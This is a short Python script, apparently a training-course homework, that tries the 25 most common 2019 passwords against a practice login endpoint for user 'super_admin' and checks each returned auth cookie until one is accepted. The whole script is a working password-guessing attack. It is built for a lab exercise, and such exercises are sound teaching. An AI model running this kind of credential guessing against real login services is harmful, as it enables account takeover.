import requests

list_most_common_passwords_2019 = [
    "123456",
    "123456789",
    "qwerty",
    "password",
    "1234567",
    "12345678",
    "12345",
    "iloveyou",
    "111111",
    "123123",
    "abc123",
    "qwerty123",
    "1q2w3e4r",
    "admin",
    "qwertyuiop",
    "654321",
    "555555",
    "lovely",
    "7777777",
    "welcome",
    "888888",
    "princess",
    "dragon",
    "password1",
    "123qwe"
]


def check_list_passwords():
    password = ""

    for i in range(len(list_most_common_passwords_2019)):
        payload1 = {"login": "super_admin", "password": list_most_common_passwords_2019[i]}
        responce1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=payload1)

        cookie_value = dict(responce1.cookies).get("auth_cookie")
        print(cookie_value)

        cookies = {}

        if cookie_value is not None:
            cookies.update({'auth_cookie': cookie_value})

        responce2 = requests.post("https://playground.learnqa.ru/api/check_auth_cookie", cookies=cookies)

        print(responce2.text)

        if responce2.text == "You are authorized":
            password = list_most_common_passwords_2019[i]
            print(responce2.text)
            break
    return password


print("Пароль найден: " + check_list_passwords())
